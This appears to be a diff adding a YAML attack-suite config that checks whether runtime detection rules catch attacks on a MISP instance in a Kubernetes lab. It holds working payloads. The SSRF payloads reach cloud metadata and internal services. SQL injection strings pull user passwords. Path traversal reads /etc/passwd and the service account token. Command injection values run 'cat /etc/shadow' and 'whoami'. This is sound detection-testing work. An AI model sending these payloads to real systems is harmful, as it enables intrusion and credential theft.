@@ -1,0 +1,179 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: misp-attacks
+  description: >-
+    Attack suite for MISP (Malware Information Sharing Platform).
+    MISP runs nginx + PHP-FPM + supervisord on Debian, serving HTTPS on 443.
+    Attacks exploit SSRF (feed URL fetching), SQL injection on search/filter
+    endpoints, and command injection via REST API object attributes.
+    Uses protocol: https → bobctl deploys a test pod and executes attacks
+    via kubectl exec curl (bypasses K8s API proxy limitations).
+target:
+  service: misp
+  namespace: misp
+  port: 443
+  protocol: https
+
+attacks:
+  # ─── SSRF: Feed URL fetching (MISP fetches threat intel feeds from URLs) ──
+  # The /feeds endpoint can be tricked into making server-side requests to
+  # internal cluster services.
+
+  - name: ssrf-cluster-metadata
+    type: ssrf
+    http:
+      method: POST
+      path: /feeds/previewIndex
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  - name: ssrf-internal-service
+    type: ssrf
+    http:
+      method: POST
+      path: /feeds/previewIndex
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2Fstorage.honey.svc.cluster.local%3A8443%2Fapis"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0005
+        ruleName: "Unexpected domain request"
+        containerName: misp
+
+  # ─── SQL Injection: Search/filter endpoints ────────────────────────────
+  # MISP's CakePHP-based search endpoints pass user input to SQL queries.
+
+  - name: sqli-events-search
+    type: sqli
+    http:
+      method: GET
+      path: /events/index
+      queryParams:
+        searchinfo: "' OR 1=1--"
+      headers:
+        Accept: application/json
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: sqli
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+
+  - name: sqli-attributes-search
+    type: sqli
+    http:
+      method: GET
+      path: /attributes/search
+      queryParams:
+        value: "1' UNION SELECT password FROM users--"
+      headers:
+        Accept: application/json
+    successIndicators:
+      - statusCode: 200
+
+  # ─── LFI: Path traversal via REST API ─────────────────────────────────
+  # Attempt to read sensitive files through improperly validated path parameters.
+
+  - name: lfi-etc-passwd
+    type: lfi
+    http:
+      method: GET
+      path: /events/view/../../../../../../etc/passwd
+    successIndicators:
+      - bodyContains: "root:"
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0010
+        ruleName: "Unexpected Sensitive File Access"
+        containerName: misp
+
+  - name: lfi-sa-token
+    type: lfi
+    http:
+      method: GET
+      path: /events/view/../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+    successIndicators:
+      - bodyContains: "eyJ"
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0006
+        ruleName: "Unexpected Service Account Token Access"
+        containerName: misp
+
+  # ─── Command Injection: Object attribute values (MISP processes attributes) ─
+  # MISP processes indicator values (IPs, domains, filenames). Malicious
+  # attributes can inject commands in worker processes.
+
+  - name: cmdinject-attribute-value
+    type: cmdinject
+    http:
+      method: POST
+      path: /attributes/add/0
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+      body: '{"request":{"Attribute":{"type":"filename","value":"; cat /etc/shadow","category":"Payload delivery","to_ids":false}}}'
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0010
+        ruleName: "Unexpected Sensitive File Access"
+        containerName: misp
+        command: cat
+
+  - name: cmdinject-enrichment
+    type: cmdinject
+    http:
+      method: POST
+      path: /attributes/add/0
+      headers:
+        Content-Type: application/json
+        Accept: application/json
+      body: '{"request":{"Attribute":{"type":"ip-dst","value":"127.0.0.1;whoami","category":"Network activity","to_ids":false}}}'
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: "Unexpected process launched"
+        containerName: misp
+        command: whoami
+
+expectedDetections:
+  # DNS anomaly from SSRF feeds fetching external/internal URLs
+  - attackType: ssrf
+    ruleID: R0005
+    ruleName: "Unexpected domain request"
+    containerName: misp
+
+  # Unexpected process from command injection
+  - attackType: cmdinject
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    containerName: misp
+
+  # Sensitive file access from LFI or command injection
+  - attackType: lfi
+    ruleID: R0010
+    ruleName: "Unexpected Sensitive File Access"
+    containerName: misp
+
+  # SA token access from LFI
+  - attackType: lfi
+    ruleID: R0006
+    ruleName: "Unexpected Service Account Token Access"
+    containerName: misp
